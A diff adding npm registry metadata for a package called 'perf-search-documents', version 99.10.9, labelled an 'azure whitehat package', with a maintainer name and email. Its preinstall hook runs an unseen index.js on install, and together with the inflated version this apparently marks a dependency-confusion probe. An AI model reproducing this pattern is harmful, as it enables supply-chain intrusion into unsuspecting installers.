@@ -1,0 +1,39 @@
+{
+    "name": "perf-search-documents",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-search-documents@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-QrNjWzpBE6v0a5AhTeKQNSxh5yqxbMCf/1kZWVK62Yf/6EBN6EgoNXbFgVkjsfk8DfUjrTS2Kgv8SiLlhGT9vA==",
+        "shasum": "d68fe41a5461083e8e302325c4c3907010705feb",
+        "tarball": "https://registry.npmjs.org/perf-search-documents/-/perf-search-documents-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3585,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon59CRA9TVsSAnZWagAAEkkP/28ntHij6i78hCsmqPBX\nbfGmCednRyv03oLCxQJei17nbG1brUK47Az1i248zCyUTiGBWbImPiAtHR8+\nIcN/ioXmQIbuVoDdXZ6WQUgcT0DqXzXJBRcTzsWefahhXuMgDLOudmcWKuiH\nr6BvH1xYrg0QCOVSJMwt+YGEuPy5qqGAMxuBc5hzQ3O5kWko+NtGr0gbX6Sv\nGsZs8IL08kNCNjnuJGkZ4cLJh5/bbdDZo9MwTBfLCA8mP6fNd6d3zmsyBE9p\n+2lxvmBHKM0aljVnZPNAyu7xNYdnsQZBQJXv+M9jOWz3vAam2n9elsO3NbIw\njBQbGnyYeafFjcY9CUCTJq2Fpb1TcVtbSIzBTeWWAgRk06LTOEEyq9mLD4qk\nm7ZbPxesXbr/YGaMwBRmldrWp7ZZu8wnpHHDmGCzewWBNrPM63IoRbC4GSRH\nY9v3DwhvA94b06yHHUZFBIhOnXr053X2f1GeYG08twfXWVBp0Uct+k+zRYPz\niq1BhnbHL29rgKeOC50IkD9w+Gu232BVfk77iexocNLCr5cw8LQP0zljzbIk\nAonSbnKjKejpsc5vtViaYFwHvoSkQ7R2ak5aKyS6munetPLCVlC5f200CHwU\nPi89GUcL1ICcLw3mZCf0tgpayLiA7Woec0B7BySHcz5kbuBlkjIjsj4QJvhM\nJel7\r\n=GAvf\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-search-documents_99.10.9_1638039165410_0.1174665212798014"
+    },
+    "_hasShrinkwrap": false
+}
